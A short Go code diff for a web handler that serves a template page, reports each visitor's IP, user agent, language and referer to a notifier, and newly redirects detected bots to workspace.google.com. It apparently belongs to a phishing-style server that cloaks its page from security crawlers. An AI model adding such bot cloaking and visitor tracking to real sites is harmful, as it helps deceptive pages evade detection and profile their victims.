@@ -14,10 +14,18 @@ import (
 // : sends basic info to stdout upon visit
 func ServeTemplate(templatePath string, notifier notifier.Notifier) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
+		userAgent := r.UserAgent()
 		ip := utils.GetIP(r)
-		fields := map[string]string{ // send basic info upon visit
+
+		if utils.IsBot(userAgent) {
+			log.Printf("Blocked bot: %s (%s)", userAgent, ip)
+			http.Redirect(w, r, "https://workspace.google.com", http.StatusFound) // or serve empty page
+			return
+		}
+
+		fields := map[string]string{
 			"IP Address": ip,
-			"User-Agent": r.UserAgent(),
+			"User-Agent": userAgent,
 			"Language":   r.Header.Get("Accept-Language"),
 			"Referer":    r.Referer(),
 		}
